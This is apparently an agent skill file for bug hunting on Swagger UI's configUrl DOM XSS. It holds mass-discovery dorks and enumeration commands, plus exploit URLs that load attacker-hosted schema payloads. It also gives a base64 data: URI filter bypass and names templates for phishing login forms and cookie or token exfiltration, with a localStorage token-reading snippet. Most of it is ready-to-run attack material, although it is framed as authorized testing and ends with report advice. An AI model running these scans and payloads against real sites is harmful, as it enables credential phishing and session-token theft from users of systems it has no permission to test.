---
name: swagger-ui-xss-testing
description: Swagger UI-specific DOM XSS/HTML injection via the configUrl query parameter — Swagger UI fetches and renders an attacker-supplied API schema URL client-side with insufficient sanitization, enabling DOM XSS, phishing-form injection, open redirects, and localStorage token theft. Covers dorking (Google/GitHub/Shodan/Censys/FOFA) to find exposed Swagger instances, path brute-forcing, ready-made payload JSON templates, and nuclei automation. Use this during Phase 1/3 (Recon/Vulnerability Testing — Client-side) of bughunting-workflow whenever a target exposes Swagger UI / OpenAPI docs (`/swagger-ui/`, `/api-docs/`, `/swagger/`). Also trigger on mentions of Swagger UI, configUrl, OpenAPI docs XSS, or swagger-ui-dist.
---

# Swagger UI XSS / HTML Injection Testing

Technique library specific to Swagger UI's `configUrl` parameter — a narrow but recurring bug class since so many APIs ship Swagger UI with defaults intact. Add new entries as new payload templates or a different Swagger-adjacent XSS vector (not just `configUrl`) get validated.

## Core theory

Swagger UI can load its API schema definition from a URL supplied via the `?configUrl=` query parameter instead of a bundled local file. Vulnerable versions fetch and render that remote/data-URI schema client-side without adequately sanitizing it, so a schema hosted by the attacker (or a `data:` URI containing one, base64-encoded) can embed executable content that runs in the origin of the Swagger UI page itself — i.e. in the origin of the target's API documentation, which is frequently on the same domain/subdomain as the API and sometimes shares auth state (tokens in `localStorage`) with the app.

## Recorded technique: full recon + exploitation methodology
Source: [The Dark Side of Swagger UI: How XSS and HTML Injection Can Compromise APIs](https://infosecwriteups.com/the-dark-side-of-swagger-ui-how-xss-and-html-injection-can-compromise-apis-1b670972a443)

### Recon — finding exposed Swagger UI instances

**Google dorks:**
```
site:*.swagger.io -www
intext:"Swagger UI" intitle:"Swagger UI" site:Target.com
inurl:"/swagger-ui/index.html"
intitle:"Swagger UI" (inurl:"/swagger-ui/" OR inurl:"/swagger/" OR inurl:"/api-docs/")
```

**GitHub dorking** (find targets still on a vulnerable `swagger-ui-dist` version, or hardcoded URLs inside repos):
```
"/swagger-ui-dist\": \"3.[1-3]/"
```

**Censys:**
```
host.services.endpoints.http.body:{"swagger", "swagger-ui"}
nasa AND host.services.endpoints.http.body:{"swagger", "swagger-ui"}
```

**FOFA (favicon-hash based):**
```
"domain.com" && (icon_hash="-1180440057" || icon_hash="-1128940573")
```

**Shodan:**
```
http.component:"Swagger"
http.title:"Swagger UI"
http.favicon.hash:"-1128940573"
http.title:"Swagger UI" +200
```

**Active enumeration:**
```bash
subfinder -d target.com -all | httpx-toolkit -silent -title | grep "Swagger UI"
# Path-probe variant — catches instances with no "Swagger UI" string in the title
subfinder -d domain.com -all -silent | httpx-toolkit -path /swagger-api/ -sc -content-length -mc 200
```

**Path brute-forcing** (when Swagger isn't linked/indexed anywhere):
```bash
ffuf -w /root/wordlist/api/swagger_xss.txt:FUZZ -w alive_ones.txt:URL -u URLFUZZ -mc 200
dirsearch -u https://api.target.com -w payloads/swagger.txt -e html,json,yaml,js -t 20
```

### Exploitation — DOM XSS via `configUrl`

**Remote schema loading (simplest form):**
```
https://target.com/?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/main/xsstest.json
```

**Base64-encoded `data:` URI form** (bypasses filters that only block external-domain `configUrl` values, since there's no external host at all):
```
https://VULNERABLE_TARGET/api-docs/?configUrl=data:text/html;base64,<BASE64_ENCODED_SCHEMA_JSON>
```

### Ready-made payload templates
Four reusable schema-JSON payload templates (host your own copy, then point `configUrl` at it):
1. **`login.json`** — injects a fake login form into the rendered page for credential phishing.
2. **`rlogin.json`** — tests for open-redirect behavior through the schema-loading mechanism.
3. **`xsstest.json`** — minimal proof-of-concept for basic DOM XSS confirmation.
4. **`xsscookie.json`** — exfiltrates cookies/tokens via injected script.

Usage pattern:
```
https://site.com/?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/main/[payload].json
```

### Token exfiltration — check `localStorage`, not just cookies
Once DOM XSS executes in the Swagger UI origin, check `localStorage` for auth tokens the underlying app/API stores there — Swagger UI itself doesn't store tokens, but if it shares an origin/subdomain with an app that does (e.g. Jamf Pro storing its auth token under the key `authToken`), the XSS in the docs page can read it directly:
```javascript
alert(localStorage.getItem('authToken'))
```
Always check `localStorage`/`sessionStorage` keys on the specific target rather than assuming a generic key name — enumerate all keys (`Object.keys(localStorage)`) first if the app-specific key name isn't known.

### Automated scanning
```bash
cat domains.txt | sort -u | nuclei -t Swagger.yaml
cat ip.txt | sort -u | nuclei -t Swagger.yaml
```

## Impact framing for report

Severity depends on what's reachable from the Swagger UI origin: if it shares an origin/subdomain with the authenticated app and tokens are readable from `localStorage`, frame this as session/token theft leading to account or API compromise, not just "XSS on the docs page." If the Swagger instance itself exposes internal/unauthenticated API endpoints (common misconfiguration — no auth enforced on `/swagger-ui/` or `/api-docs/` in production), note that as a compounding info-disclosure finding alongside the XSS.

## Toolkit

| Tool | Purpose |
|---|---|
| Google/GitHub/Shodan/Censys/FOFA dorks | Find exposed Swagger UI instances at scale |
| subfinder + httpx-toolkit | Active enumeration + title-grep for "Swagger UI" |
| ffuf / dirsearch | Path brute-force when not linked/indexed |
| nuclei (`Swagger.yaml` template) | Automated detection across a domain/IP list |
| Link Gopher (browser extension) | Bulk link extraction from a Swagger page for further crawling |

<!-- Add new recorded techniques below this line as new Swagger-UI-XSS writeups are processed. -->
